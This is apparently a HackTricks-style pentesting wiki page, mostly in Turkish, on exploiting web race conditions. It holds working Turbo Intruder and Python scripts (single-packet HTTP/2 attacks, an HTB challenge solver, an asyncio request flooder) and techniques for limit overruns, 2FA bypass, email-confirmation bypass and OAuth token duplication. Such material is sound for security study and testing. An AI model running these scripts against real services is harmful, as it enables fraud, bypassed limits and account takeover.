# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Bu teknik hakkında derinlemesine bilgi edinmek için orijinal rapora bakın: [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Enhancing Race Condition Attacks

Race condition'lardan yararlanmanın ana zorluğu, birden çok isteğin neredeyse aynı anda işlenmesini sağlamaktır; işlem süreleri arasındaki fark çok küçük olmalıdır — ideal olarak 1ms'den az.

Here you can find some techniques for Synchronizing Requests:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Tek bir TCP bağlantısı üzerinden iki istek gönderilmesini destekler, ağ jitter etkisini azaltır. Ancak sunucu tarafı varyasyonları nedeniyle, iki istek tutarlı bir race condition exploit'i için yeterli olmayabilir.
- **HTTP/1.1 'Last-Byte Sync'**: 20-30 isteğin çoğunluğunu önceden göndermeye, küçük bir parçayı geri tutmaya ve ardından bu parçaların birlikte gönderilmesiyle sunucuya eşzamanlı varış sağlamaya olanak tanır.

**Preparation for Last-Byte Sync** involves:

1. Başlıkları ve gövde verisini, akışı sonlandırmadan son bayt hariç göndermek.
2. İlk gönderimden sonra 100ms beklemek.
3. Son frame'leri paketlemek için Nagle algoritmasından yararlanmak amacıyla TCP_NODELAY'i devre dışı bırakmak.
4. Bağlantıyı ısıtmak için ping atmak.

Geri tutulan frame'lerin sonradan gönderilmesi bunların tek bir paket halinde ulaşmasına neden olmalı ve bu Wireshark ile doğrulanabilir. Bu yöntem genellikle RC attacks ile ilgili olmayan static dosyalara uygulanmaz.

### Adapting to Server Architecture

Hedefin mimarisini anlamak kritik öneme sahiptir. Front-end sunucular istekleri farklı yollarla yönlendirebilir; bu da zamanlamayı etkiler. Önemsiz isteklerle sunucu tarafı bağlantısını önceden ısıtmak istek zamanlamasını normalize edebilir.

#### Handling Session-Based Locking

PHP'nin session handler'ı gibi framework'ler istekleri session bazında seri hale getirebilir ve bu da zafiyetleri gizleyebilir. Her istek için farklı session token'ları kullanmak bu sorunun üstesinden gelebilir.

#### Overcoming Rate or Resource Limits

Bağlantı ısıtma etkisizse, sunucu tarafı gecikmesi oluşturarak web sunucularının rate veya resource limit gecikmelerini kasıtlı olarak tetiklemek, single-packet attack'i kolaylaştırabilir.

## Saldırı Örnekleri

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: İsteği **Turbo intruder**'a gönderebilirsiniz (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), istekte brute force yapmak istediğiniz değeri **`%s`** olarak değiştirebilirsiniz; örneğin `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` ve ardından açılır menüden **`examples/race-single-packer-attack.py`**'yi seçin:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

If you are going to **send different values**, you could modify the code with this one that uses a wordlist from the clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Eğer web HTTP2'yi desteklemiyorsa (sadece HTTP1.1), `Engine.THREADED` veya `Engine.BURP` kullanın, `Engine.BURP2` yerine.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Eğer RCE'yi tetiklemek için önce 1 endpoint'e istek gönderip ardından diğer endpoint'lere birden fazla istek göndermeniz gerekiyorsa, `race-single-packet-attack.py` dosyasını şu şekilde değiştirebilirsiniz:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Ayrıca **Repeater**'da Burp Suite'teki yeni '**Send group in parallel**' seçeneği ile de kullanılabilir.
- **limit-overrun** için gruba **same request 50 times** ekleyebilirsiniz.
- **connection warming** için, web sunucusunun statik olmayan bir bölümüne bazı **requests** göndermek üzere **grubun** **başına** **add** yapabilirsiniz.
- İki alt durum adımında, bir isteğin işlenmesi ile diğerinin işlenmesi arasındaki süreci **delaying** etmek için, iki istek arasına **add extra requests between** ekleyebilirsiniz.
- Bir **multi-endpoint** RC için, **goes to the hidden state** olan **request**'i göndermeye başlayıp hemen ardından **50 requests** ile **exploits the hidden state** yapabilirsiniz.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Bu script'in amacı, bir kullanıcının e-postasını değiştirmek ve yeni e-postanın doğrulama tokenı son e-postaya ulaşana kadar sürekli olarak doğrulamaktır (çünkü kodda, bir RC gözlemlenmişti: e-posta değiştirilebiliyor fakat doğrulama eski e-postaya gönderiliyordu; bunun nedeni e-postayı belirten değişkenin zaten ilk e-posta ile doldurulmuş olmasıydı).\
Alınan e-postalarda "objetivo" kelimesi bulunduğunda, değiştirilen e-postanın doğrulama tokenını aldığımızı biliriz ve saldırıyı sonlandırırız.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- Engine selection: use `Engine.BURP2` on HTTP/2 targets to trigger the single‑packet attack; fall back to `Engine.THREADED` or `Engine.BURP` for HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: birçok kopyayı `gate='race1'` (veya deneme başına gate'ler) ile kuyruğa alın; bu, her isteğin son kısmını tutar; `openGate('race1')` tüm son kısımları birlikte boşaltır, böylece neredeyse aynı anda ulaşırlar.
- Diagnostics: Turbo Intruder'daki negatif zaman damgaları, isteğin tamamen gönderilmeden önce sunucunun yanıt verdiğini gösterir; bu örtüşmeyi kanıtlar. Bu gerçek races'lerde beklenen bir durumdur.
- Connection warming: önce zamanlamaları stabilize etmek için bir ping veya birkaç zararsız istek gönderin; isteğe bağlı olarak son framelerin gruplanmasını teşvik etmek için `TCP_NODELAY`'ı devre dışı bırakın.


### Improving Single Packet Attack

In the original research it's explained that this attack has a limit of 1,500 bytes. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it was explained how it's possible to extend the 1,500-byte limitation of the single packet attack to the **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) and sending them in different order, allowed to prevent reassembling the packet until all the fragments reached the server. This technique allowed the researcher to send 10,000 requests in about 166ms.

Bu iyileştirmenin, yüzler/binlerce paketin aynı anda ulaşmasını gerektiren RC durumlarında saldırıyı daha güvenilir hale getirdiğini unutmayın; ancak bazı yazılım sınırlamaları da olabilir. Apache, Nginx ve Go gibi bazı popüler HTTP sunucularının `SETTINGS_MAX_CONCURRENT_STREAMS` ayarı sırasıyla 100, 128 ve 250 ile sınırlıdır. Ancak NodeJS ve nghttp2 gibi diğerleri bunu sınırsız tutar.\
Bu temelde Apache'nin tek bir TCP bağlantısından yalnızca 100 HTTP bağlantısını dikkate alacağı (bu RC saldırısını sınırlayacağı) anlamına gelir.

Bu tekniği kullanan bazı örnekleri repo içinde bulabilirsiniz: [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Önceki araştırmadan önce, paketleri mümkün olduğunca hızlı göndererek bir RC oluşturmayı amaçlayan bazı payload'lar kullanılıyordu.

- **Repeater:** Önceki bölümdeki örneklere bakın.
- **Intruder**: **request**'i **Intruder**'a gönderin, **Options menu** içinde **number of threads**'i **30** olarak ayarlayın; payload olarak **Null payloads**'ı seçin ve **30** tane oluşturun.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Bu, en temel race condition türüdür; burada **zafiyetler**, bir işlemi kaç kez gerçekleştirebileceğinizi **sınırlayan** yerlerde **ortaya çıkar**. Örneğin aynı indirim kodunu bir web mağazasında birkaç kez kullanmak. Çok basit bir örnek [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) veya [**this bug**](https://hackerone.com/reports/759247)** içinde bulunabilir.**

Bu tür saldırıların birçok varyasyonu vardır, örneğin:

- Bir hediye kartını birden fazla kez kullanma
- Bir ürünü birden fazla kez puanlama
- Hesap bakiyenizin üzerinde para çekme veya transfer etme
- Tek bir CAPTCHA çözümünü tekrar kullanma
- Bir anti-brute-force rate limitini atlatma

### **Hidden substates**

Complex race conditions'ları istismar etmek sıklıkla gizli veya **istem dışı makina alt durumlarıyla** etkileşim kurmak için kısa fırsatlardan yararlanmayı içerir. Bu yaklaşımla ilerleyin:

1. **Identify Potential Hidden Substates**
- Öncelikle user profile'lar veya password reset süreçleri gibi kritik verileri değiştiren veya onlarla etkileşime giren endpoints'leri belirleyin. Aşağıya odaklanın:
- **Storage**: Client-side ile işlem yapan endpoint'lerden ziyade server-side persistent data'yı değiştiren endpoint'leri tercih edin.
- **Action**: Yeni veri ekleyen operasyonlara kıyasla mevcut veriyi değiştiren işlemler exploit için daha elverişli koşullar yaratma eğilimindedir.
- **Keying**: Başarılı saldırılar genellikle aynı identifier üzerinde anahtarlanan operasyonları içerir; örn. username veya reset token.
2. **Conduct Initial Probing**
- Belirlenen endpoint'leri race condition saldırılarıyla test edin ve beklenen sonuçlardan sapma olup olmadığını gözlemleyin. Beklenmeyen yanıtlar veya uygulama davranışındaki değişiklikler zafiyet işareti olabilir.
3. **Demonstrate the Vulnerability**
- Saldırıyı istismarı sağlayan en az sayıda isteğe indirgediğinizden emin olun; genellikle iki istek yeterlidir. Bu adım, hassas zamanlama nedeniyle birden fazla deneme veya otomasyon gerektirebilir.

### Time Sensitive Attacks

İsteklerin zamanlamasındaki hassasiyet zafiyetleri ortaya çıkarabilir; özellikle timestamp gibi öngörülebilir yöntemler security token'lar için kullanıldığında. Örneğin, password reset token'larının timestamp'e göre üretilmesi, eş zamanlı istekler için aynı token'ların oluşturulmasına izin verebilir.

**To Exploit:**

- Eş zamanlı password reset istekleri yapmak için tek paketlik saldırı gibi hassas zamanlama kullanın. Identical token'lar zafiyete işaret eder.

**Example:**

- Aynı anda iki password reset token isteğinde bulunun ve bunları karşılaştırın. Token'ların eşleşmesi token generation'da bir kusur olduğunu gösterir.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

Bu [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) örneğini inceleyin; mağazada **pay** edip aynı anda **add an extra** item yaparak onun için **ödeme yapmamanızı** sağlayacak yöntemi gösterir.

### Confirm other emails

Amaç, bir email adresini **doğrulamak ve aynı anda farklı bir email ile değiştirmek** ve platformun yeni email'i doğrulayıp doğrulamadığını görmek.

### Change email to 2 emails addresses Cookie based

[**this research**](https://portswigger.net/research/smashing-the-state-machine) raporuna göre Gitlab bu şekilde takeover'a karşı zayıftı çünkü bir email'in email verification token'ını diğer email'e **gönderebilirdi**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

Eğer bir veritabanına bilgi eklemek için **2 farklı write** kullanılıyorsa, veritabanına sadece ilk verinin yazıldığı kısa bir zaman dilimi olabilir. Örneğin kullanıcı oluşturulurken **username** ve **password** yazıldıktan sonra yeni hesabı onaylamak için token yazılabilir. Bu durumda kısa bir süre için hesap onayı token'ı null olur.

Bu yüzden kayıt oluşturup hemen hesabı onaylamak için boş token'larla (`token=` veya `token[]=` veya diğer herhangi bir varyasyon`) birkaç istek göndermek, email'i kontrol etmediğiniz bir hesabı **confirm etmenize** izin verebilir.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

Aşağıdaki pseudo-code race condition'a karşı savunmasızdır çünkü çok kısa bir süre boyunca session oluşturulurken **2FA uygulanmaz**:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 sürekli kalıcılık

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Bu servisler bir application oluşturmanıza ve provider'ın kayıtlı kullanıcılarını authenticate etmenize izin verir. Bunu yapabilmek için **client**'ın **permit your application** ile **OAUth provider** içindeki bazı verilerine erişmesine izin vermeniz gerekir.\
Yani buraya kadar google/linkedin/github... ile yapılan sıradan bir login: karşınıza "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_" diye bir sayfa çıkar.

#### Race Condition in `authorization_code`

The **problem** appears when you **accept it** and automatically sends an **`authorization_code`** to the malicious application. Sonrasında bu **application**, OAUth service provider'daki bir Race Condition'ı kullanarak hesabınız için **`authorization_code`**'dan birden fazla AT/RT (_Authentication Token/Refresh Token_) üretir. Temelde, uygulamaya verilerinize erişim izni verdiğiniz gerçeğini kötüye kullanarak **çeşitli hesaplar oluşturur**. Daha sonra eğer uygulamanın verilerinize erişmesine izin vermeyi **durdurursanız** bir AT/RT çifti silinebilir, fakat diğerleri hala geçerli olmaya devam eder.

#### Race Condition in `Refresh Token`

Once you have **obtained a valid RT** you could try to **abuse it to generate several AT/RT** ve **even if the user cancels the permissions** kötü amaçlı uygulamanın verilerine erişimini iptal etse bile, **birkaç RT yine de geçerli kalacaktır.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) Java ile websocket mesajlarını **parallel** göndermek için bir PoC bulabilirsiniz; Web Sockets içinde de **Race Conditions**'ı kötüye kullanmak için.
- Burp’un WebSocket Turbo Intruder ile **THREADED** engine'i kullanarak birden fazla WS bağlantısı başlatabilir ve paralel olarak payload'lar gönderebilirsiniz. Resmi örnekten başlayın ve `config()` (thread count) ile concurrency'yi ayarlayın; sunucu tarafı state'i WS handler'ları arasında race ederken tek bir bağlantıda batchlemeye kıyasla bu genellikle daha güvenilirdir. Bkz. [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
